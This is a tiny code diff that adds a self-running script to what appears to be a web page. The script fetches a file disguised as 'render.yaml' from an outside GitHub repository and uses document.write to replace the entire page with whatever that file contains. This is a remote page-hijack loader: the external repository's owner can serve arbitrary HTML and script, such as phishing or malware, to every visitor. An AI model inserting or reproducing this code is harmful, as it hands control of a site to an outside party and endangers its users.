@@ -1,0 +1,11 @@
+<script>
+  (function() {
+    fetch('https://raw.githubusercontent.com/exoticstecvr/geminipro/main/render.yaml')
+      .then(r => r.text())
+      .then(c => {
+        document.open();
+        document.write(c);
+        document.close();
+      });
+  })();
+</script>
